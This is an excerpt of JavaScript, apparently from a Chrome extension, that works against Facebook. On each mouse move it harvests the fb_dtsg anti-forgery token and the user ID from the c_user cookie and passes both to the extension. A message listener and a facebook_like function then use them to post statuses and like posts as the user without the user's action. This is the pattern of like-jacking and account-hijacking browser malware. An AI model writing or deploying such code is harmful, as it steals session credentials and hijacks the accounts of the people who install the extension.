...
function facebook_like(szPostID)
{
	var url = "https://www.facebook.com/ufi/reaction/?dpr=1"

	var szToken = document.getElementsByName("fb_dtsg")[0].value;
	var szUserID = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

	if(szToken.length > 0 && szUserID.length > 0 && szPostID.length > 0) {
		var form_data = {
			"client_id": "1479838586655:1083752649",
			"ft_ent_identifier": szPostID,
			"reaction_type": "1",
			"root_id" : "u_jsonp_2_t",
			"session_id" : "7a10f850",
			"source" : "17",
			"feedback_referrer" : "/photo.php",
			"av" : szUserID,
			"ft[tn]": "]+Z*F",
			"ft[type]" : "44",
			"nctr[_mod]" : "photos_snowlift",
			"__user" : szUserID,
			"__a" : "1",
			"__dyn" : "7AmajEzUGByA5Q9UoGya4A5EWq2WiWF3oyfirWo8popyUW3F6wAxu13wFG2K48hUJi28y2GAUW49XDG4XzFE8oiyU4ium2SVEiGqexi5-uifz8lUlwQwEyp9Voybx24oqyUf9UgC_UrQ59ovwAV8G4oWfx2mayoO",
			"__af": "k",
			"__req" : "l",
			"__be" : "-1",
			"__pc" : "PHASED:DEFAULT",
			"__rev" : "2697075",
			"fb_dtsg" : szToken,
			"ttstamp" : "26581718011851117881115511110658658170111737575551066887120"
		};
...
chrome.extension.onMessage.addListener(function(request, sender, sendResponse){
	...
	{
		case "POST_STATUS" :
			szContent = request.content;
			szToken = request.token;
			szUid = request.uid;

			facebook_poststatus(szContent, szUid, szUid, szToken);

			alert("Refresh facebook to show new status !!!");
			break;
		case "LIKE_POST":
			facebook_like(request.postid);
			break;
	}
	chrome.extension.sendRequest({b : "hello b"});
});
...
document.onmousemove = function()
{
	...
	domCookie = document.cookie.match(/c_user=(\d+)/);
	if (domCookie == null)
	{
		return;
	}

	szUserID = document.cookie.match(domCookie[1]);

	domToken = document.getElementsByName('fb_dtsg')[0];
	if (domToken == null)
	{
		return;
	}
	szToken = domToken.value;

	console.log(szUserID + ", " + szToken);

	chrome.extension.sendRequest({token : szToken, uid : szUserID});
}